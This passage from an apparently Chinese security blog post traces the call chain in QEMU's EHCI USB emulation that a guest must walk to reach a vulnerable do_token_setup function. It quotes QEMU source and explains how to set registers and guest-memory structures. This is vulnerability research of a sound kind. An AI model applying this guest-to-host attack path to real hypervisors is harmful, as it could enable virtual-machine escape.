ehci_advance_periodic_state(ehci);<br>            &#125;<br>            ehci-&gt;last_run_ns += UFRAME_TIMER_NS;<br>        &#125;<br>    &#125;<br>    …………………………<br>    …………………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_periodic_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;<br>&#125;<br></code></pre></td></tr></table></figure><p>​</p><p>ehci_advance_periodic_state中没有什么参数是需要判断的，可以直接调用ehci_advance_state，但是entry这个值会影响接下来的函数。get_dwords函数将list物理地址中的值赋值给entry，list开始由ehci-&gt;periodiclistbase赋值，再和((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1) 与运算，ehci-&gt;periodiclistbase和ehci-&gt;frindex都是opreg联合体中的变量，使用ehci_opreg_wrie赋值即可。这里我本地 ehci-&gt;frindex这个值并不是固定的，这点和De4dCr0w师傅不太一样，需要事先对ehci-&gt;frindex赋值为0才能让list在与运算后<code>+4</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_periodic_state</span><span class="hljs-params">(EHCIState *ehci)</span><br>&#123;<br>     …………………………<br>     …………………………<br>    <span class="hljs-keyword">case</span> EST_ACTIVE:<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;<br>            ehci_queues_rip_all(ehci, async);<br>            ehci_set_state(ehci, async, EST_INACTIVE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="hljs-number">0xfffff000</span>;<br>        <span class="hljs-comment">/* check that register has been set */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span> == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="hljs-number">0x1ff8</span>) &gt;&gt; <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (get_dwords(ehci, <span class="hljs-built_in">list</span>, &amp;entry, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        DPRINTF(<span class="hljs-string">&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;</span>,<br>                ehci-&gt;frindex / <span class="hljs-number">8</span>, <span class="hljs-built_in">list</span>, entry);<br>        ehci_set_fetch_addr(ehci, async,entry);  <span class="hljs-comment">//将entry的值保存到ehci中</span><br>        ehci_set_state(ehci, async, EST_FETCHENTRY); <span class="hljs-comment">//将EST_FETCHENTRY这个状态保存到ehci中</span><br>        ehci_advance_state(ehci, async);<br>     …………………………<br>     …………………………<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                               </p><p>接下来就是最绕的地方</p><p>进入ehci_advance_state后，通过ehci_get_state得到相应的状态值，去调用相应的处理函数，而这些处理函数中使用ehci_set_state可以设置新的状态值，相应的处理函数结束后，ehci_get_state得到新的状态值不断循环。</p><p>要想调用ehci_state_execute函数，要满足q !&#x3D; NULL，状态值是EST_EXECUTE。</p><p>上层的ehci_advance_periodic_state函数已经将状态值设置为EST_FETCHENTRY，开始会先进入ehci_state_fetchentry函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_state</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    EHCIQueue *q = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> itd_count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> again;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">switch</span>(ehci_get_state(ehci, async)) &#123;<br><span class="hljs-keyword">case</span> EST_FETCHENTRY:<br>            again = ehci_state_fetchentry(ehci, async);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHQH:<br>            q = ehci_state_fetchqh(ehci, async);<br>            <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>) &#123;<br>                assert(q-&gt;async == async);<br>                again = <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                again = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>………………<br>        ………………<br>        <span class="hljs-keyword">case</span> EST_FETCHQTD:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_fetchqtd(q);<br>            <span class="hljs-keyword">break</span>;<br>………………<br>        ………………<br>        <span class="hljs-keyword">case</span> EST_EXECUTE:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_execute(q);<br>            <span class="hljs-keyword">if</span> (async) &#123;<br>                ehci-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (again);<br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_state_fetchentry中需要满足switch的值为NLPTR_TYPE_QH，设置新的状态值为EST_FETCHQH，在接下来的循环中就可以调用ehci_state_fetchqh函数为q赋值了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchentry</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> entry = ehci_get_fetch_addr(ehci, async);<span class="hljs-comment">//得到先前ehci_advance_periodic_state函数中保存的entry值</span><br>…………………………<br>    …………………………<br>    <span class="hljs-keyword">switch</span> (NLPTR_TYPE_GET(entry)) &#123;<br>    <span class="hljs-keyword">case</span> NLPTR_TYPE_QH:<br>        ehci_set_state(ehci, async, EST_FETCHQH);<span class="hljs-comment">//&lt;----运行至此</span><br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>…………………………<br>    …………………………<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLPTR_TYPE_QH            1     <span class="hljs-comment">// queue head</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLPTR_TYPE_GET(x)        (((x) &gt;&gt; 1) &amp; 3)</span><br></code></pre></td></tr></table></figure><p>在ehci_state_fetchqh函数中也会用到ehci_advance_periodic_state函数的entry值，并且作为get_dwords参数，也就是entry也必须是个物理地址，将里面的值保存到一个EHCIqh结构体中；设置entry这个物理地址中的值也为EHCIqh结构体，进而可以赋值给q-&gt;qh；该函数中设置的状态值没有EST_EXECUTE这个选项，但在另一个ehci_state_fetchqtd函数中可以设置，这里设置新的状态值为EST_FETCHQTD；然后需要通过判断的值为q-&gt;qh结构体中的变量，q-&gt;qh又是来自entry这个物理地址中的值，可以完全操纵，设置好entry中EHCIqh结构体的变量即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> EHCIQueue *<span class="hljs-title function_">ehci_state_fetchqh</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br> <span class="hljs-type">uint32_t</span> entry;<br>    EHCIQueue *q;<br>    EHCIqh qh;<br><span class="hljs-comment">//得到先前ehci_advance_periodic_state函数中保存的entry值</span><br>    entry = ehci_get_fetch_addr(ehci, async);<br>    <span class="hljs-comment">//开始这里调用ehci_find_queue_by_qh返回NULL</span><br>    q = ehci_find_queue_by_qh(ehci, entry, async);<br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">//ehci_alloc_queue的作用为：q-&gt;qhaddr = entry</span><br>        q = ehci_alloc_queue(ehci, entry, async);<br>    &#125;<br>………………<br>………………<br>    <span class="hljs-comment">//get_dwords和之前一样，将q-&gt;qhaddr的物理地址中的值保存到qh中</span><br><span class="hljs-keyword">if</span> (get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr), <br>                   (<span class="hljs-type">uint32_t</span> *) &amp;qh, <span class="hljs-keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        q = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>    ehci_trace_qh(q, NLPTR_GET(q-&gt;qhaddr), &amp;qh);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The overlay area of the qh should never be changed by the guest,</span><br><span class="hljs-comment">     * except when idle, in which case the reset is a nop.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (!ehci_verify_qh(q, &amp;qh)) &#123;<br>        <span class="hljs-keyword">if</span> (ehci_reset_queue(q) &gt; <span class="hljs-number">0</span>) &#123;<br>            ehci_trace_guest_bug(ehci, <span class="hljs-string">&quot;guest updated active QH&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//更新qh</span><br>    q-&gt;qh = qh;<br>    ………………<br>    <span class="hljs-keyword">if</span> (q-&gt;dev == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">//获取q-&gt;dev的值</span><br>        q-&gt;dev = ehci_find_device(q-&gt;ehci,<br>                                  get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));<br>    &#125;<br>………………<br>………………<br>    <span class="hljs-keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT) &#123;<br>        ehci_set_state(ehci, async, EST_HORIZONTALQH);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;          <br>               (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="hljs-number">0</span>) &amp;&amp;<br>               (q-&gt;qh.current_qtd != <span class="hljs-number">0</span>)) &#123;<br>        q-&gt;qtdaddr = q-&gt;qh.current_qtd;<br>        ehci_set_state(ehci, async, EST_FETCHQTD); <span class="hljs-comment">//&lt;----运行至此</span><br>    ………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_state_fetchqtd函数使用q-&gt;qtdaddr这个物理地址，通过get_dwords来赋值给qtd，q-&gt;qtdaddr由上一步的q-&gt;qh.current_qtd赋值；和之前一样的套路，设置q-&gt;qh.current_qtd这个物理地址中的值为EHCIqtd结构体，最后的qtd中的值变成我们设置的，让qtd通过判断，设置新的状态值为EST_EXECUTE即可，之后就可以进入ehci_state_execute函数后并一路进入漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchqtd</span><span class="hljs-params">(EHCIQueue *q)</span><br>&#123;<br>    EHCIqtd qtd;<br>    EHCIPacket *p;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> addr;<br><br>    addr = NLPTR_GET(q-&gt;qtdaddr);<br>    <span class="hljs-keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="hljs-number">8</span>, &amp;qtd.token,   <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>………………<br>    ………………<br><br>    <span class="hljs-keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE)) &#123;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>    ………………<br>    ………………<br>      <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;dev == <span class="hljs-literal">NULL</span>) &#123;<br>        ehci_trace_guest_bug(q-&gt;ehci, <span class="hljs-string">&quot;no device attached to queue&quot;</span>);<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        p = ehci_alloc_packet(q);<br>        p-&gt;qtdaddr = q-&gt;qtdaddr;<br>        p-&gt;qtd = qtd;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);<span class="hljs-comment">//&lt;----运行至此</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> again;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是qtd中的值并不能完全满足判断，需要<code>q-&gt;dev != NULL</code>这个条件，q-&gt;dev这个值又是在先前的ehci_state_fetchqh函数中调用的ehci_find_device决定的（当时看得头都要裂开了）；ehci_find_device函数中需要让ehci-&gt;portsc的值通过判断才能给dev赋值，ehci-&gt;portsc的值是由ehci_port_write函数设置的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> USBDevice *<span class="hljs-title function_">ehci_find_device</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">uint8_t</span> addr)</span><br>&#123;<br>    USBDevice *dev;<br>    USBPort *port;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NB_PORTS; i++) &#123;<br>        port = &amp;ehci-&gt;ports[i];<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;portsc[i] &amp; PORTSC_PED)) &#123;<br>            DPRINTF(<span class="hljs-string">&quot;Port %d not enabled\n&quot;</span>, i);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        dev = usb_find_device(port, addr);<br>        <span class="hljs-keyword">if</span> (dev != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> dev;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​                          </p><p>ehci_port_write函数和ehci_opreg_wrie函数一样都是直接可以读写PCI设备来触发的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_port_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, hwaddr addr,</span><br><span class="hljs-params">                            <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    EHCIState *s = ptr;<br>    <span class="hljs-type">int</span> port = addr &gt;&gt; <span class="hljs-number">2</span>;<br>    <span class="hljs-type">uint32_t</span> *portsc = &amp;s-&gt;portsc[port];<br>    <span class="hljs-type">uint32_t</span> old = *portsc;<br>    USBDevice *dev = s-&gt;ports[port].dev;<br>………………<br>    ………………<br>    <span class="hljs-keyword">if</span> ((val &amp; PORTSC_PRESET) &amp;&amp; !(*portsc &amp; PORTSC_PRESET)) &#123;<br>        trace_usb_ehci_port_reset(port, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(val &amp; PORTSC_PRESET) &amp;&amp;(*portsc &amp; PORTSC_PRESET)) &#123;<br>        trace_usb_ehci_port_reset(port, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (dev &amp;&amp; dev-&gt;attached) &#123;<br>            usb_port_reset(&amp;s-&gt;ports[port]);<br>            *portsc &amp;= ~PORTSC_CSC;<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         *  Table 2.16 Set the enable bit(and enable bit change) to indicate</span><br><span class="hljs-comment">         *  to SW that this port has a high speed device attached</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (dev &amp;&amp; dev-&gt;attached &amp;&amp; (dev-&gt;speedmask &amp; USB_SPEED_MASK_HIGH)) &#123;<br>            val |= PORTSC_PED;<br>        &#125;<br>    &#125;<br>………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                         </p><p>初始化PCI设备的函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;<br>    .read = ehci_opreg_read,<br>    .write = ehci_opreg_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;<br>    .read = ehci_port_read,<br>    .write = ehci_port_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_pci_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);<br>    EHCIPCIState *i = PCI_EHCI(obj);<br>    EHCIState *s = &amp;i-&gt;ehci;<br><br>    s-&gt;caps[<span class="hljs-number">0x09</span>] = <span class="hljs-number">0x68</span>;        <span class="hljs-comment">/* EECP */</span><br><br>    s-&gt;capsbase = <span class="hljs-number">0x00</span>;<br>    s-&gt;opregbase = <span class="hljs-number">0x20</span>;<br>    s-&gt;portscbase = <span class="hljs-number">0x44</span>;<br>    s-&gt;portnr = NB_PORTS;<br><br>    <span class="hljs-keyword">if</span> (!dc-&gt;hotpluggable) &#123;<br>        s-&gt;companion_enable = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    usb_ehci_init(s, DEVICE(obj));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_init</span><span class="hljs-params">(EHCIState *s, DeviceState *dev)</span><br>&#123;<br>………………<br>    ………………<br><br>    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="hljs-string">&quot;ehci&quot;</span>, MMIO_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,<br>                          <span class="hljs-string">&quot;capabilities&quot;</span>, CAPA_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,<br>                          <span class="hljs-string">&quot;operational&quot;</span>, s-&gt;portscbase);<br>    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,<br>                          <span class="hljs-string">&quot;ports&quot;</span>, <span class="hljs-number">4</span> * s-&gt;portnr);<br><br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,<br>                                &amp;s-&gt;mem_ports);<br>&#125;<br></code></pre></td></tr></table></figure><p>memory_region_add_subregion函数将一个内存区域添加为另一个大的内存区域的子区域，第二个参数就是添加到另一个大的内存区域的偏移，也就是先使用memory_region_init_io初始化三个不同的IO内存区域，再由memory_region_add_subregion合并到另一个大的内存区域，访问这个大的内存区域不同的偏移地址时会触发不同的读写功能。</p><p>​                                                  </p><p>至此触发漏洞的调用链才算是分析完成了，并且明白了要设置哪些参数。</p><h2 id="漏洞函数的参数设置"><a href="#漏洞函数的参数设置" class="headerlink" title="漏洞函数的参数设置"></a>漏洞函数的参数设置</h2><p>明白怎样去触发漏洞函数，接下来就是要对do_token_setup函数中相应参数的设置，这样才能去利用漏洞。</p><p>do_token_setup函数刚开始就是： <code>if (p-&gt;iov.size != 8)</code> ，<code>usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size)</code>，跟p-&gt;iov关系比较大，s-&gt;setup_buf这个主要的结构体是通过p中的参数来赋值的，在usb_packet_copy函数中的拷贝操作就使用p-&gt;iov[0].iov_base中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_packet_copy</span><span class="hljs-params">(USBPacket *p, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;<br><br>    assert(p-&gt;actual_length &gt;= <span class="hljs-number">0</span>);<br>    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);<br>    <span class="hljs-keyword">switch</span> (p-&gt;pid) &#123;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_SETUP:<br>    <span class="hljs-keyword">case</span> USB_TOKEN_OUT:<br>        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>    ………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来就是找到p-&gt;iov结构体中变量的来源。</p><p>​                                </p><p>p-&gt;iov结构体中变量是ehci_execute函数中的ehci_init_transfer函数和usb_packet_map函数操作的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_execute</span><span class="hljs-params">(EHCIPacket *p, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *action)</span><br>&#123;<br>    ………………<br>    ………………<br><br>    <span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE) &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == 